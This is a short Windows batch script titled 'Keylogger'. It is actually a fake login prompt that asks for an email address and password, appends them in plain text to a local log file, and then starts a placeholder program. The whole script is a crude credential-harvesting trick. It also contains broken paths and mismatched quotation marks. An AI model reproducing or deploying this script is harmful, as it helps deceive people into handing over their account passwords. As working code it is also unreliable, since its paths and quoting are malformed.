@echo off
color a
title Keylogger
cls
echo Please Enter Your Email Address And Password
echo.
echo.
set /p user=Username:
set /p pass=Password:
echo Username="%user%” Password=”%pass%" >> C:LogsLog.txt
pause
start >>Program Here<<
cd "C:Logs"
exit